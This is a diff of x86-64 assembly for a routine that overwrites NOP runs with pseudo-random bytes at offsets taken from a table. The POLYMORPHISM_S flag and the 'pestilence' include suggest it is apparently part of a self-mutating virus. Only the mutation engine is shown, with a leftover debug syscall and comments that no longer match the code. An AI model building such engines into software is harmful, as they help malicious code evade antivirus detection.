@@ -1,4 +1,5 @@
 %define POLYMORPHISM_S
+%include "pestilence.lst"
 
 section	.text
 	global	_timestamp
@@ -186,7 +187,7 @@ _urand_end:
 
 ;; -----------------------------------------------------------------------------
 ;; SYNOPSIS
-;;		void	_byterpl(void *ptr, size_t len)
+;;		void	_byterpl(void *start)
 ;;
 ;; DESCRIPTION
 ;;		It searches 4 NOPs (0x90) in a row into the buffer pointed by ptr and 
@@ -197,49 +198,25 @@ _urand_end:
 _byterpl:
 	enter	32, 0
 	push	rdi
-	push	rsi
-	push	r10
+;	push	rsi
+;	push	r10
 
 	xor		rax, rax
-	mov		qword [rbp - 8], rax			; global offset
+	mov		qword [rbp - 8], rax			; table_offset
 	mov		qword [rbp - 16], rax			; temporary offset
 	mov		qword [rbp - 24], rax			; backup value for PRNG
+	mov		rsi, 0
 
 _byterpl_loop:
-	cmp		qword [rbp - 8], rsi			; did we go too far ?
-	jge		_byterpl_end					; yeup, we're done
+	cmp rsi, 32
+	jge _byterpl_end
 
-	cmp		byte [rdi], 0x90				; if we found a 0x90
-	je		_byterpl_init					; check if we have 5 in a row
-
-	inc		rdi								; move to the next byte
-	inc		qword [rbp - 8]					; increment global offset
-
-	jmp		_byterpl_loop					; check next byte
-
-_byterpl_init:
-	xor		rcx, rcx						; clear counter
-	mov		r10, rdi						; set up temporary pointer
-	mov		rax, qword [rbp - 8]
-	mov		qword [rbp - 16], rax
-
-_byterpl_check:
-	cmp		qword [rbp - 16], rsi			; did we go too far ?
-	jge		_byterpl_end					; yeup, we're done
-
-	cmp		byte [r10], 0x90				; is the byte different from 0x90 ?
-	jne		_byterpl_test					; yeup, check the counter
-
-	inc		rcx								; increase counter
-	inc		r10								; move to next byte
-	inc		qword [rbp - 16]				; increase temporary counter
-	jmp		_byterpl_check					; loop back
-
-_byterpl_test:
-	cmp		rcx, 4							; is our counter up to 4 ?
-	jge		_byterpl_replace				; great, replace at this offset
-	inc		rdi								; move to next byte
-	jmp		_byterpl_loop					; nope, back to main loop...
+	lea r10, [rel _table_offset]
+	add r10, QWORD [rbp - 8]
+	mov rdi, QWORD [rsp]
+	xor r11, r11
+	mov r11d, DWORD [r10]
+	add rdi, r11
 
 _byterpl_replace:
 	push	rdi								; save up
@@ -271,15 +248,22 @@ _byterpl_insert:
 
 	mov		dword [rdi], r11d				; replace content of this offset
 
-	add		rdi, 5							; move main pointer +5
-	add		qword [rbp - 8], 5				; move global offset +5
+	add		qword [rbp - 8], 4				; move global offset +5
+	inc 	rsi
+	push rsi
+	mov rax, 1
+	mov rdi, 1
+	mov rsi, QWORD [rsp + 16]
+	mov rdx, 8
+	syscall
+	pop rsi
 	
 	jmp		_byterpl_loop					; jump back to main loop...
 
 _byterpl_end:
 	mov		rax, qword [rbp - 24]
-	pop		r10
-	pop		rsi
+;	pop		r10
+;	pop		rsi
 	pop		rdi
 	leave
 	ret
